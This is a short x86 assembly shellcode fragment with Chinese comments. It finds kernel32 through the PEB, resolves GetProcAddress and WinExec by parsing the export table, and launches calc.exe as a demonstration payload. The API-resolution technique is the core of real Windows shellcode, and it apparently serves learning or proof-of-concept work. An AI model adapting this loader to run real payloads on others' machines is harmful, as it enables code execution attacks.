    ;调用winexec执行打开计算器
    xor eax, eax;
    mov eax, fs: [eax + 30h] ; 指向PEB的指针
    mov eax, [eax + 0ch]; 指向PEB_LDR_DATA的指针
    mov eax, [eax + 0ch]; 根据PEB_LDR_DATA得出InMemoryOrderModuleList的Flink字段
    mov esi, [eax];
    mov eax, [esi];
    mov eax, [eax + 18h]; Kernel.dll的基地址
    // mov ebx, eax;存下Kernel.dll的基地址
    push ebp;
    mov ebp, esp; 建立新栈帧
    push eax;


    add eax, [eax + 3ch]; 
    lea eax, [eax + 18h]; 
    lea eax, [eax + 0x60]; 
    mov ebx, [esp];
    add ebx, [eax]; 
    mov eax, [ebx + 0x20];
    add eax, [esp]; 
    mov esi, eax;

GetFunc:
    inc ecx; 
    mov eax, [esi]; 
    add esi, 4; 
    add eax, [esp]; 
    cmp dword ptr[eax], 0x50746547;
    jnz GetFunc;
    cmp dword ptr[eax + 4], 0x41636f72;
    jnz GetFunc;
    pop edx; 
    push eax; 
    mov eax, [ebx + 24h]; 
    add eax, edx; 

    mov cx, [eax + ecx * 2]; 
    dec ecx;

    mov eax, [ebx + 1ch]; 
    add eax, edx; 

    mov eax, [eax + ecx * 4]; 
    add eax, edx;
    mov ebx, eax;

    // 获取libary函数的地址
    xor ecx, ecx;
    push ebp;
    mov ebp, esp; 
    push ebx; 存入getp函数的地址
    push edx; 存入kernel32的地址
    push ecx; 存入零值空行

    push 0x61636578; xeca
    sub dword ptr[esp + 3], 0x61; 删除a字符
    push 0x456e6957; WinE

    push esp;
    push edx;
    call ebx;winexec地址

    add esp, 0x8; 
    pop ecx;
    push eax; 
    push ecx;

    push 0x6578652e;
    push 0x636c6163;calc.exe
    push esp;
    call eax;